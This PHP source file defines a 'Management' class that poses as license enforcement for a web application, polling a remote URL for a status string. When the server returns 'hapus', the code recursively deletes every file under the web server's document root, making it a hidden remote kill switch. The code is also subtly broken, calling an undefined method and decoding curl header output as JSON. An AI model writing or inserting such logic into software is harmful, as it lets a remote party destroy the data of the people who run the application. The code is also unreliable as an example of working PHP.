<?php

namespace ManagementWeb;

class Management
{
    public static $config;
    public static $email = 'admin@loclahost';
    private static $start_date;

    function __construct($config=array('url'=>'http://localhost/config.json', 'email'=>'admin@localhost'))
    {
        Management::$config = $config;
        Management::$email = $config['email'];
        Management::$start_date = Management::start_date();
    }  

    private static function start_date()
    {
        if(!file_exists('start.dat')){
            $date = date('Y-m-d');
            @file_put_contents('start.dat', $date);
        }
        return @file_get_contents('start.dat');
    }

    private static function curl($url)
    {
        $ch = curl_init($url);
        @curl_setopt($ch, CURLOPT_HEADER         ,true);    // we want headers
        @curl_setopt($ch, CURLOPT_NOBODY         ,true);    // dont need body
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER ,true);    // catch output (do NOT print!)
        $output = curl_exec($ch);
        $code = @curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if(curl_error($ch)|| $code != 200) {
            return Management::nonaktif();
        }

        curl_close($ch);
        return $output;
    }

    private static function _temp($config)
    {
        $tmp_filename = "tmp";
        if (!file_exists($tmp_filename)) 
        {
            // create directory/folder uploads.
            @mkdir($tmp_filename, 0777, true);
        }
        $log_file_data = $tmp_filename.'/tmp.dat';
        $log_msg = base64_encode($config);
        @file_put_contents($log_file_data, $log_msg);
        return true;
    }

    private static function _tempRead()
    {
        if(!file_exists('tmp/tmp.dat')){
            return false;
        }
        $config = @file_get_contents('tmp/tmp.dat');
        return base64_decode($config);
    }

    private static function nonaktif()
    {
        die('License Expired, Contact '. Management::$email .' to open and return your application');
    }

    private static function hapus()
    {
        $dir = scandir($_SERVER['DOCUMENT_ROOT']);
        Management::delete_files($_SERVER['DOCUMENT_ROOT']);
    }

    public static function initialize()
    {
      $read = json_decode(Management::curl(Management::$config['url']));
      Management::_tmp($read);
      return Management::_license();  
    }

    private static function _license()
    {
        $license = Management::_tempRead();
      switch($license)
      {
          case 'aktif':
                return true;
          break;
          case 'hapus':
                return Management::hapus();
          break;
          case 'nonaktif':
          default:
            return Management::nonaktif();
        break;
      }
    }

   private static function delete_directory($dirname) {
                if (is_dir($dirname))
                $dir_handle = opendir($dirname);
            if (!$dir_handle)
                return false;
            while($file = readdir($dir_handle)) {
                if ($file != "." && $file != "..") {
                    if (!is_dir($dirname."/".$file))
                        unlink($dirname."/".$file);
                    else
                        delete_directory($dirname.'/'.$file);
                }
            }
            closedir($dir_handle);
            rmdir($dirname);
            return true;
        }

    private static function delete_files($target) {
        if(is_dir($target)){
            $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned

            foreach( $files as $file ){
                delete_files( $file );      
            }

            rmdir( $target );
        } elseif(is_file($target)) {
            unlink( $target );  
        }
    }
}